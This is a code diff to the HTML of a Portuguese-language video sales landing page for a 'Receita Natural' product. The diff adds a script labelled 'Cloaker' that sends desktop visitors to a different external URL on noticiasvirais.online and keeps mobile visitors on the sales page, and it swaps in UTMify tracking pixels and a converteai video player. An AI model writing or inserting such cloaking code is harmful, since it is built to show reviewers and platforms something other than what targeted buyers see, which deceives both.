@@ -3,9 +3,22 @@
 
 <head>
   <meta charset="UTF-8" />
-  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Receita Natural – Kit Amostras 01</title>
+  <!-- Cloaker: redireciona desktop para URL alternativa; mobile permanece na página -->
+  <script type="text/javascript">
+    (function () {
+      var url_link_redirect_pc = "https://url.noticiasvirais.online/pag1?preview=150bdc393e02fc1f2f7ab5a84b01430e83b5cec56baac6778dd999207df07327|eyJ0cyI6MTc3MTEzODkwNywiZGF0YSI6eyJ2aWV3IjoxfX0=";
+      function isMobile() {
+        var regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        return regex.test(navigator.userAgent);
+      }
+      if (!isMobile()) {
+        window.location.replace(url_link_redirect_pc);
+      }
+    })();
+  </script>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
   <meta name="description" content="Landing page VSL with comments section" />
 
   <!-- Google Fonts -->
@@ -17,9 +30,6 @@
 
   <link rel="stylesheet" href="/src/style.css">
 
-  <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
-    data-token="ec67da39-a867-40a4-afcc-2d2d8865d179">
-    </script>
 
   <script>
     window.onload = function () {
@@ -40,6 +50,23 @@
     }
 
   </script>
+
+  <!-- UTMify Pixel -->
+  <script>
+    window.pixelId = "6994004b5257c15c3ae8a5f1";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
 </head>
 
 <body>
@@ -71,8 +98,7 @@
 
         <!-- VSL Video -->
         <div class="video-container">
-          <vturb-smartplayer id="vid-698cdfcb9a130410492e1173"
-            style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer>
+          <vturb-smartplayer id="vid-698cdfcb9a130410492e1173"></vturb-smartplayer>
           <script
             type="text/javascript"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/685914c5-09d4-416e-89b1-75ab46ab6914/players/698cdfcb9a130410492e1173/v4/player.js", s.async = !0, document.head.appendChild(s); </script>
         </div>
